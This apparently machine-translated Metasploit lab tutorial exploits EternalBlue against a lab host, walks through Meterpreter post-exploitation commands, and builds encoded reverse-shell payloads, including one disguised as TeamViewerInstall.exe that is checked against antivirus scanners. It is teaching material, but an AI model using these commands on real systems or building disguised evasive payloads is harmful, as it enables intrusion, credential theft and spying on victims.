## 使用负载

是时候为 Exploit 模块和 payload 模块设置我们的参数了。对于利用部分，我们需要设置以下内容：

| **范围** | **描述**                                               |
| -------- | ------------------------------------------------------ |
| `RHOSTS` | 远程主机的 IP 地址，目标机器。                         |
| `RPORT`  | 不需要更改，只需检查我们是否在运行 SMB 的端口 445 上。 |

对于有效负载部分，我们需要设置以下内容：

| **范围** | **描述**                               |
| -------- | -------------------------------------- |
| `LHOST`  | 主机的IP地址，攻击者的机器。           |
| `LPORT`  | 不需要更改，只需检查端口是否已被使用。 |

如果我们想快速查看我们的 LHOST IP 地址，我们总是可以`ifconfig`直接从 msfconsole 菜单中调用该命令。

#### MSF - 利用和有效负载配置

```shell-session
msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig

**[\*]** exec: ifconfig

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500

<SNIP>

inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15

<SNIP>


msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15

LHOST => 10.10.14.15


msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40

RHOSTS => 10.10.10.40
```

然后，我们可以运行漏洞并查看它返回的内容。查看以下输出中的差异：

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (201283 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > whoami

[-] Unknown command: whoami.

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

​	该提示不是 Windows 命令行提示，而是`Meterpreter`提示符。通常用于 Windows 的命令`whoami`在这里不起作用。相反，我们可以使用 Linux 等效的`getuid`. 探索`help`菜单让我们更深入地了解 Meterpreter 有效载荷的能力。

#### MSF - Meterpreter 命令

```shell-session
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                当前会话的背景
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of Unicode strings
    enable_unicode_encoding   Enables encoding of Unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    IRB                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Strap: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    LCD           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    PWD           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Strap: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    get proxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of hostnames on the target
    route         View and modify the routing table


Strap: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system's local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Strap: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idle time       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user's desktop in real-time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Strap: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    get system     Attempt to elevate your privilege to that of the local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestamp Commands
========================

    Command       Description
    -------       -----------
    timestamp     Manipulate file MACE attributes
```

很漂亮。从从 SAM 中提取用户哈希值到截取屏幕截图和激活网络摄像头。所有这些都是通过 Linux 风格的命令行轻松完成的。进一步探索，我们还看到了打开 shell 通道的选项。这将使我们进入实际的 Windows 命令行界面。

#### MSF - Meterpreter 导航

```shell-session
meterpreter > cd Users
meterpreter > ls

Listing: C:\Users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users
40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default
40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User
40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public
100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini
40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris


meterpreter > shell

Process 2664 created.
Channel 1 created.

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>
```

`Channel 1`已创建，我们将自动放入此机器的 CLI 中。这里的通道表示我们的设备和目标主机之间的连接，它已经使用 Meterpreter Stager 和 Stage 在反向 TCP 连接（从目标主机到我们）中建立。stager 在我们的机器上被激活，以等待由目标机器上的 Stage 有效负载初始化的连接请求。

在某些情况下，进入目标的标准 shell 是有帮助的，但 Meterpreter 也可以在受害机器上导航和执行操作。所以我们看到命令发生了变化，但我们在系统内具有相同的权限级别。

#### MSF-Windows CMD

```shell-session
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Users>dir

dir
 Volume in drive C has no label.
 Volume Serial Number is A0EF-1911

 Directory of C:\Users

21/07/2017  07:56    <DIR>          .
21/07/2017  07:56    <DIR>          ..
21/07/2017  07:56    <DIR>          Administrator
14/07/2017  14:45    <DIR>          haris
12/04/2011  08:51    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  15,738,978,304 bytes free

C:\Users>whoami

whoami
nt authority\system
```

让我们看看我们可以使用哪些其他类型的有效载荷。我们将研究与 Windows 操作系统相关的最常见的问题。

## 有效载荷类型

下表包含用于 Windows 机器的最常见有效负载及其各自的描述。

| **有效载荷**                      | **描述**                                                     |
| --------------------------------- | ------------------------------------------------------------ |
| `generic/custom`                  | 通用监听器，多用途                                           |
| `generic/shell_bind_tcp`          | 通用监听器，多用途，普通 shell，TCP 连接绑定                 |
| `generic/shell_reverse_tcp`       | 通用侦听器，多用途，普通外壳，反向 TCP 连接                  |
| `windows/x64/exec`                | 执行任意命令 (Windows x64)                                   |
| `windows/x64/loadlibrary`         | 加载任意 x64 库路径                                          |
| `windows/x64/messagebox`          | 使用可自定义的标题、文本和图标通过 MessageBox 生成一个对话框 |
| `windows/x64/shell_reverse_tcp`   | 普通 shell，单一负载，反向 TCP 连接                          |
| `windows/x64/shell/reverse_tcp`   | 普通shell，stager + stage，反向TCP连接                       |
| `windows/x64/shell/bind_ipv6_tcp` | 普通外壳，stager + stage，IPv6 Bind TCP stager               |
| `windows/x64/meterpreter/$`       | Meterpreter payload + 以上变体                               |
| `windows/x64/powershell/$`        | 交互式 PowerShell 会话 + 以上品种                            |
| `windows/x64/vncinject/$`         | VNC 服务器（反射注入）+ 以上品种                             |

渗透测试人员在安全评估期间大量使用的其他关键有效载荷是 Empire 和 Cobalt Strike 有效载荷。这些不在本课程的范围内，但您可以在我们的空闲时间随意研究它们，因为它们可以提供大量关于专业渗透测试人员如何对高价值目标进行评估的见解。

当然，除了这些之外，还有许多其他有效载荷。有些是针对特定设备供应商的，例如 Cisco、Apple 或 PLC。有些我们可以使用`msfvenom`. 然而，接下来，我们将研究`Targets`以及如何使用它们来影响攻击结果。

# 编码器

------

在 Metasploit 框架存在的 15 年中，`Encoders`它帮助使有效负载与不同的处理器架构兼容，同时帮助逃避防病毒。`Encoders`发挥改变有效载荷以在不同操作系统和体系结构上运行的作用。这些架构包括：

| `x64` | `x86` | `sparc` | `ppc` | `mips` |
| ----- | ----- | ------- | ----- | ------ |
|       |       |         |       |        |

`bad characters`还需要它们从有效负载中删除已知的十六进制操作码。不仅如此，以不同格式编码有效载荷也有助于如上所述的反病毒检测。然而，随着 IPS/IDS 制造商改进了他们的保护软件处理恶意软件和病毒签名的方式，严格用于 AV 规避的编码器的使用随着时间的推移已经减少。

Shikata Ga Nai ( `SGN`) 是当今最常用的编码方案之一，因为它很难检测到通过其机制编码的有效载荷不再普遍无法检测到。离得很远。名称 ( `仕方がない`) 的意思是`It cannot be helped`or `Nothing can be done about it`，如果我们几年前读到这篇文章的话，这是理所当然的。但是，我们将探索其他方法来规避保护系统。[来自 FireEye 的这篇文章](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html)详细介绍了 Shikata Ga Nai 之前统治其他编码器的原因和方式。

------

## 选择编码器

在 2015 年之前，Metasploit 框架有不同的子模块来处理负载和编码器。它们与 msfconsole 脚本分开打包，并称为`msfpayload`and `msfencode`。这两个工具位于`/usr/share/framework2/`.

如果我们想创建我们的自定义负载，我们可以通过 来实现`msfpayload`，但我们必须根据目标操作系统架构对其进行编码，`msfencode`然后再使用。管道将从一个命令获取输出并将其馈送到下一个命令，这将生成一个编码的有效负载，准备好发送并在目标机器上运行。

 

```shell-session
vnswer77@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai

[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)

my $buf = 
"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
"\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
"\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
"\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
"\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
"\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
"\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .

<SNIP>
```

2015 年之后，这些脚本的更新已将它们合并到`msfvenom`工具中，该工具负责有效负载生成和编码。`msfvenom`后面我们会详细讲到。下面是今天的有效负载生成的示例`msfvenom`：

#### 生成有效载荷 - 无编码

 生成有效载荷 - 无编码

```shell-session
vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl

Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of perl file: 1674 bytes
my $buf = 
"\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
"\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
"\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
"\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" .
"\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .

<SNIP>
```

我们现在应该看一下的第一行`$buf`，看看它在应用像 . 这样的编码器时是如何变化的`shikata_ga_nai`。

#### 生成有效载荷 - 使用编码

 生成有效载荷 - 使用编码

```shell-session
vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Found 1 compatible encoders
Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 326 (iteration=0)
x86/shikata_ga_nai succeeded with size 353 (iteration=1)
x86/shikata_ga_nai succeeded with size 380 (iteration=2)
x86/shikata_ga_nai chosen with final size 380
Payload size: 380 bytes
buf = ""
buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"

<SNIP>
```

如果我们想查看`shikata_ga_nai`编码器的功能，我们可以查看[此处的](https://hatching.io/blog/metasploit-payloads2/)精彩帖子。

假设我们要为`existing payload`. 然后，我们可以使用`show encoders`中的命令`msfconsole`来查看哪些编码器可用于我们当前的`Exploit module + Payload`组合。

 Shikata Ga Nai编码

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

在前面的例子中，我们只看到了一些适合 x64 系统的编码器。与可用的 payload 一样，这些都是根据 Exploit 模块自动过滤的，只显示兼容的。例如，让我们试试`MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`.

 Shikata Ga Nai编码

```shell-session
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

Compatible Encoders
===================

   Name                    Disclosure Date  Rank       Description
   ----                    ---------------  ----       -----------
   generic/none                             normal     The "none" Encoder
   x86/alpha_mixed                          low        Alpha2 Alphanumeric Mixedcase Encoder
   x86/alpha_upper                          low        Alpha2 Alphanumeric Uppercase Encoder
   x86/avoid_utf8_tolower                   manual     Avoid UTF8/tolower
   x86/call4_dword_xor                      normal     Call+4 Dword XOR Encoder
   x86/context_cpuid                        manual     CPUID-based Context Keyed Payload Encoder
   x86/context_stat                         manual     stat(2)-based Context Keyed Payload Encoder
   x86/context_time                         manual     time(2)-based Context Keyed Payload Encoder
   x86/countdown                            normal     Single-byte XOR Countdown Encoder
   x86/fnstenv_mov                          normal     Variable-length Fnstenv/mov Dword XOR Encoder
   x86/jmp_call_additive                    normal     Jump/Call XOR Additive Feedback Encoder
   x86/nonalpha                             low        Non-Alpha Encoder
   x86/nonupper                             low        Non-Upper Encoder
   x86/shikata_ga_nai                       excellent  Polymorphic XOR Additive Feedback Encoder
   x86/single_static_bit                    manual     Single Static Bit
   x86/unicode_mixed                        manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
   x86/unicode_upper                        manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

就拿上面的例子来说吧——一个假设的例子。如果我们只使用 SGN 对可执行负载进行一次编码，那么它很可能会被当今的大多数防病毒软件检测到。让我们深入研究一下。拿起处理`msfvenom`有效载荷生成和编码方案的框架的下标，我们有以下输入：

 Shikata Ga Nai编码

```shell-session
vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of exe file: 73802 bytes
Saved as: TeamViewerInstall.exe
```

这将生成一个`exe`格式为 TeamViewerInstall.exe 的有效负载，该格式适用于 Windows 平台的 x86 架构处理器，具有隐藏的 Meterpreter reverse_tcp shell 有效负载，使用 Shikata Ga Nai 方案编码一次。让我们把结果上传到 VirusTotal。

一个更好的选择是尝试通过相同编码方案的多次迭代来运行它：

 Shikata Ga Nai编码

```shell-session
vnswer77@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai succeeded with size 395 (iteration=1)
x86/shikata_ga_nai succeeded with size 422 (iteration=2)
x86/shikata_ga_nai succeeded with size 449 (iteration=3)
x86/shikata_ga_nai succeeded with size 476 (iteration=4)
x86/shikata_ga_nai succeeded with size 503 (iteration=5)
x86/shikata_ga_nai succeeded with size 530 (iteration=6)
x86/shikata_ga_nai succeeded with size 557 (iteration=7)
x86/shikata_ga_nai succeeded with size 584 (iteration=8)
x86/shikata_ga_nai succeeded with size 611 (iteration=9)
x86/shikata_ga_nai chosen with final size 611
Payload size: 611 bytes
Final size of exe file: 73802 bytes
Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe
```

正如我们所看到的，这仍然不足以进行 AV 规避。仍有大量产品可以检测有效负载。或者，Metasploit 提供了一个工具`msf-virustotal`，我们可以使用它和 API 密钥来分析我们的有效载荷。但是，这需要在 VirusTotal 上免费注册。

#### 无国界医生 - VirusTotal

 无国界医生 - VirusTotal

```shell-session
vnswer77@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe

[*] Using API key: <API key>
[*] Please wait while I upload TeamViewerInstall.exe...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 4f54cc46e2f55be168cc6114b74a3130
[*] Sample SHA1 hash   : 53fcb4ed92cf40247782de41877b178ef2a9c5a9
[*] Sample SHA256 hash : 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
[*] Analysis link: https://www.virustotal.com/gui/file/<SNIP>/detection/f-<SNIP>-1651750343
[*] Requesting the report...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: TeamViewerInstall.exe (51 / 68): 66894cbecf2d9a31220ef811a2ba65c06fdfecddbc729d006fdab10e43368da8
==================================================================================================================

 Antivirus             Detected  Version                                                         Result                                                     Update
 ---------             --------  -------                                                         ------                                                     ------
 ALYac                 true      1.1.3.1                                                         Trojan.CryptZ.Gen                                          20220505
 APEX                  true      6.288                                                           Malicious                                                  20220504
 AVG                   true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505
 Acronis               true      1.2.0.108                                                       suspicious                                                 20220426
 Ad-Aware              true      3.0.21.193                                                      Trojan.CryptZ.Gen                                          20220505
 AhnLab-V3             true      3.21.3.10230                                                    Trojan/Win32.Shell.R1283                                   20220505
 Alibaba               false     0.3.0.5                                                                                                                    20190527
 Antiy-AVL             false     3.0                                                                                                                        20220505
 Arcabit               true      1.0.0.889                                                       Trojan.CryptZ.Gen                                          20220505
 Avast                 true      21.1.5827.0                                                     Win32:SwPatch [Wrm]                                        20220505
 Avira                 true      8.3.3.14                                                        TR/Patched.Gen2                                            20220505
 Baidu                 false     1.0.0.2                                                                                                                    20190318
 BitDefender           true      7.2                                                             Trojan.CryptZ.Gen                                          20220505
 BitDefenderTheta      true      7.2.37796.0                                                     Gen:NN.ZexaF.34638.eq1@aC@Q!ici                            20220428
 Bkav                  true      1.3.0.9899                                                      W32.FamVT.RorenNHc.Trojan                                  20220505
 CAT-QuickHeal         true      14.00                                                           Trojan.Swrort.A                                            20220505
 CMC                   false     2.10.2019.1                                                                                                                20211026
 ClamAV                true      0.105.0.0                                                       Win.Trojan.MSShellcode-6360728-0                           20220505
 Comodo                true      34592                                                           TrojWare.Win32.Rozena.A@4jwdqr                             20220505
 CrowdStrike           true      1.0                                                             win/malicious_confidence_100% (D)                          20220418
 Cylance               true      2.3.1.101                                                       Unsafe                                                     20220505
 Cynet                 true      4.0.0.27                                                        Malicious (score: 100)                                     20220505
 Cyren                 true      6.5.1.2                                                         W32/Swrort.A.gen!Eldorado                                  20220505
 DrWeb                 true      7.0.56.4040                                                     Trojan.Swrort.1                                            20220505
 ESET-NOD32            true      25218                                                           a variant of Win32/Rozena.AA                               20220505
 Elastic               true      4.0.36                                                          malicious (high confidence)                                20220503
 Emsisoft              true      2021.5.0.7597                                                   Trojan.CryptZ.Gen (B)                                      20220505
 F-Secure              false     18.10.978-beta,1651672875v,1651675347h,1651717942c,1650632236t                                                             20220505
 FireEye               true      35.24.1.0                                                       Generic.mg.4f54cc46e2f55be1                                20220505
 Fortinet              true      6.2.142.0                                                       MalwThreat!0971IV                                          20220505
 GData                 true      A:25.32960B:27.27244                                            Trojan.CryptZ.Gen                                          20220505
 Gridinsoft            true      1.0.77.174                                                      Trojan.Win32.Swrort.zv!s2                                  20220505
 Ikarus                true      6.0.24.0                                                        Trojan.Win32.Swrort                                        20220505
 Jiangmin              false     16.0.100                                                                                                                   20220504
 K7AntiVirus           true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505
 K7GW                  true      12.10.42191                                                     Trojan ( 001172b51 )                                       20220505
 Kaspersky             true      21.0.1.45                                                       HEUR:Trojan.Win32.Generic                                  20220505
 Kingsoft              false     2017.9.26.565                                                                                                              20220505
 Lionic                false     7.5                                                                                                                        20220505
 MAX                   true      2019.9.16.1                                                     malware (ai score=89)                                      20220505
 Malwarebytes          true      4.2.2.27                                                        Trojan.Rozena                                              20220505
 MaxSecure             true      1.0.0.1                                                         Trojan.Malware.300983.susgen                               20220505
 McAfee                true      6.0.6.653                                                       Swrort.i                                                   20220505
 McAfee-GW-Edition     true      v2019.1.2+3728                                                  BehavesLike.Win32.Swrort.lh                                20220505
 MicroWorld-eScan      true      14.0.409.0                                                      Trojan.CryptZ.Gen                                          20220505
 Microsoft             true      1.1.19200.5                                                     Trojan:Win32/Meterpreter.A                                 20220505
 NANO-Antivirus        true      1.0.146.25588                                                   Virus.Win32.Gen-Crypt.ccnc                                 20220505
 Paloalto              false     0.9.0.1003                                                                                                                 20220505
 Panda                 false     4.6.4.2                                                                                                                    20220504
 Rising                true      25.0.0.27                                                       Trojan.Generic@AI.100 (RDMK:cmRtazqDtX58xtB5RYP2bMLR5Bv1)  20220505
 SUPERAntiSpyware      true      5.6.0.1032                                                      Trojan.Backdoor-Shell                                      20220430
 Sangfor               true      2.14.0.0                                                        Trojan.Win32.Save.a                                        20220415
 SentinelOne           true      22.2.1.2                                                        Static AI - Malicious PE                                   20220330
 Sophos                true      1.4.1.0                                                         ML/PE-A + Mal/EncPk-ACE                                    20220505
 Symantec              true      1.17.0.0                                                        Packed.Generic.347                                         20220505
 TACHYON               false     2022-05-05.02                                                                                                              20220505
 Tencent               true      1.0.0.1                                                         Trojan.Win32.Cryptz.za                                     20220505
 TrendMicro            true      11.0.0.1006                                                     BKDR_SWRORT.SM                                             20220505
 TrendMicro-HouseCall  true      10.0.0.1040                                                     BKDR_SWRORT.SM                                             20220505
 VBA32                 false     5.0.0                                                                                                                      20220505
 ViRobot               true      2014.3.20.0                                                     Trojan.Win32.Elzob.Gen                                     20220504
 VirIT                 false     9.5.188                                                                                                                    20220504
 Webroot               false     1.0.0.403                                                                                                                  20220505
 Yandex                true      5.5.2.24                                                        Trojan.Rosena.Gen.1                                        20220428
 Zillya                false     2.0.0.4625                                                                                                                 20220505
 ZoneAlarm             true      1.0                                                             HEUR:Trojan.Win32.Generic                                  20220505
 Zoner                 false     2.2.2.0                                                                                                                    20220504
 tehtris               false     v0.1.2                                                                                                                     20220505
```

正如预期的那样，我们在野外遇到的大多数反病毒产品仍会检测到此有效负载，因此我们将不得不使用本模块范围之外的其他方法来规避 AV。

# 数据库

------

`Databases`in`msfconsole`用于跟踪您的结果。毫无疑问，在更复杂的机器评估期间，更不用说整个网络了，由于搜索结果、入口点、检测到的问题、发现的凭据等的绝对数量，事情会变得有点模糊和复杂。

这就是数据库发挥作用的地方。`Msfconsole`内置了对 PostgreSQL 数据库系统的支持。有了它，我们可以直接、快速、轻松地访问扫描结果，并增加了与第三方工具一起导入和导出结果的能力。数据库条目也可用于直接使用现有的调查结果配置漏洞利用模块参数。

------

## 设置数据库

首先，我们必须确保 PostgreSQL 服务器在我们的主机上启动并运行。为此，请输入以下命令：

#### PostgreSQL 状态

 PostgreSQL 状态

```shell-session
